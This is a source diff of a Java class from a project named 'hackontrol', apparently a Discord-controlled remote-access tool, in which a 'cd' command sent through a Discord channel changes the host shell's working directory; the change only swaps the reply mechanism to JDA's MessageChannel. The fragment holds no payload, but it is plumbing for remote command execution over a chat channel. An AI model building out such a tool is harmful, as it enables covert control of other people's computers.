@@ -2,9 +2,7 @@ package com.khopan.hackontrol.channel.command;
 
 import java.io.File;
 
-import com.khopan.hackontrol.manager.common.sender.sendable.ISendable;
-
-import net.dv8tion.jda.api.utils.messages.MessageCreateData;
+import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
 
 public class ChangeDirectoryCommand {
 	private ChangeDirectoryCommand() {}
@@ -13,33 +11,33 @@ public class ChangeDirectoryCommand {
 		return (command.length() == 2 && command.startsWith("cd")) || command.startsWith("cd ");
 	}
 
-	public static void execute(ISendable sender, String command) {
+	public static void execute(MessageChannel channel, String command) {
 		if(command.length() == 2) {
 			String directory = CommandChannel.CurrentDirectory == null ? "SYSTEMROOT" : CommandChannel.CurrentDirectory.getAbsolutePath();
-			sender.send(MessageCreateData.fromContent('`' + directory + '`'), null);
+			channel.sendMessage('`' + directory + '`').queue();
 			return;
 		}
 
 		command = command.substring(3).trim();
 
 		if(command.isEmpty()) {
-			sender.send(MessageCreateData.fromContent("`Command input is empty`"), null);
+			channel.sendMessage("`Command input is empty`").queue();
 			return;
 		}
 
 		File file = new File(command);
 
 		if(!file.exists()) {
-			sender.send(MessageCreateData.fromContent("`The system cannot find the path specified.`"), null);
+			channel.sendMessage("`The system cannot find the path specified.`").queue();
 			return;
 		}
 
 		if(!file.isDirectory()) {
-			sender.send(MessageCreateData.fromContent("`The directory name is invalid.`"), null);
+			channel.sendMessage("`The directory name is invalid.`").queue();
 			return;
 		}
 
 		CommandChannel.CurrentDirectory = file;
-		sender.send(MessageCreateData.fromContent('`' + file.getAbsolutePath() + '`'), null);
+		channel.sendMessage('`' + file.getAbsolutePath() + '`').queue();
 	}
 }
